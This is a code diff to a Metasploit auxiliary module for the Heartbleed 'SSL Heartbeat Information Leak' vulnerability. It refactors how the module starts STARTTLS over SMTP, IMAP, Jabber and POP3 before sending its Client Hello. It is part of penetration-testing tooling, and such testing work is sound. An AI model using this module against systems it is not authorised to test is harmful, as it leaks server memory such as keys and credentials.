@@ -69,6 +69,13 @@ class Metasploit3 < Msf::Auxiliary
   HEARTBEAT_RECORD_TYPE = 0x18
   TLS_VERSION = 0x0302 # TLS 1.1
 
+  TTLS_CALLBACKS = {
+    'SMTP'   => :tls_smtp,
+    'IMAP'   => :tls_imap,
+    'JABBER' => :tls_jabber,
+    'POP3'   => :tls_pop3
+  }
+
   def initialize
     super(
       'Name'        => 'SSL Heartbeat Information Leak',
@@ -102,7 +109,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(443),
-        OptEnum.new('PROTOCOL', [true, 'Protocol to use with SSL', 'WEB', [ 'WEB', 'SMTP', 'IMAP', 'JABBER', 'POP3' ]])
+        OptEnum.new('STARTTLS', [true, 'Protocol to use with STARTTLS, None to avoid STARTTLS ', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3' ]])
       ], self.class)
   end
 
@@ -113,7 +120,7 @@ class Metasploit3 < Msf::Auxiliary
   def tls_smtp
     # https://tools.ietf.org/html/rfc3207
     sock.get_once
-    sock.put("EHLO #{rand_text_alpha(10)}\n")
+    sock.put("EHLO #{Rex::Text.rand_text_alpha(10)}\n")
     res = sock.get_once
 
     unless res && res =~ /STARTTLS/
@@ -169,40 +176,13 @@ class Metasploit3 < Msf::Auxiliary
   def run_host(ip)
     connect
 
-    case datastore['PROTOCOL']
-      when "WEB"
-        # no STARTTLS needed
-      when "SMTP"
-        print_status("Trying to start SSL via SMTP")
-        res = tls_smtp
-        if res.nil?
-          print_error("#{peer} - STARTTLS failed...")
-          return
-        end
-      when "IMAP"
-        print_status("Trying to start SSL via IMAP")
-        res = tls_imap
-        if res.nil?
-          print_error("#{peer} - STARTTLS failed...")
-          return
-        end
-      when "JABBER"
-        print_status("Trying to start SSL via JABBER")
-        res = tls_jabber
-        if res.nil?
-          print_error("#{peer} - STARTTLS failed...")
-          return
-        end
-      when "POP3"
-        print_status("Trying to start SSL via POP3")
-        res = tls_pop3
-        if res.nil?
-          print_error("#{peer} - STARTTLS failed...")
-          return
-        end
-      else
-        print_error("Unknown protocol #{datastore['PROTOCOL']}")
+    unless datastore['STARTTLS'] == 'None'
+      print_status("Trying to start SSL via #{datastore['STARTTLS']}")
+      res = self.send(TTLS_CALLBACKS[datastore['STARTTLS']])
+      if res.nil?
+        print_error("#{peer} - STARTTLS failed...")
         return
+      end
     end
 
     print_status("#{peer} - Sending Client Hello...")
